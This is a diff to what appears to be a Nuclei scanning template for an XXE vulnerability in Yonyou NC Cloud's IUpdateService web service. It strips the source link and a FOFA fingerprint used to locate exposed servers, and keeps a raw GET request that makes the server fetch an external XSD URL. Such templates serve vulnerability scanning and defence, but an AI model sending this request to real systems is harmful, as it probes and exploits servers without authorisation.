@@ -3,12 +3,8 @@ info:
   name: 用友NC Cloud IUpdateService接口存在XXE漏洞2
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uukr25q591rw6sk9'
+  description: ''
   tags: xxe,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: uukr25q591rw6sk9
-    fofa: icon_hash="1085941792"
 http:
 - raw:
   - 'GET /uapws/service/nc.uap.oba.update.IUpdateService?xsd=http://www.baidu.com HTTP/1.1
